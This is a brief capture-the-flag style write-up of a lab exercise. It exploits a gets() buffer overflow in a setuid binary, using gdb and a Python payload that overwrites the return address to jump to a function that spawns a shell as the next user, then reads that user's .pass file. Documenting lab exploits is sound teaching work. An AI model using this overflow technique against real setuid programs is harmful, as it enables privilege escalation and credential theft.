# Level 1

We have an executable "./level1" owned by level2.
```sh
$ ls -l
total 8
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

He's reading on standard entry. When we decopile it, when see a gets() function who store the input in a buffer of 76. We can perform a buffer overflow.

```sh
$ python -c "print 'A' * 77" | ./level1
Illegal instruction (core dumped)
```

We can also see a run() function who start a shell as level2 at the memory address 0x804844a. 
```sh
$ gdb ./level1
(gdb) b run
Breakpoint 1 at 0x804844a
```

We want to enter in this function. For this, we have to override the part of the stack (EIP) dedicated to the next function to execute.
```sh
$ (python -c "print 'A' * 76 + '\x4a\x84\x04\x08'"; cat) | ./level1
Good... Wait what?

whoami
level2

cd ../level2

cat .pass
```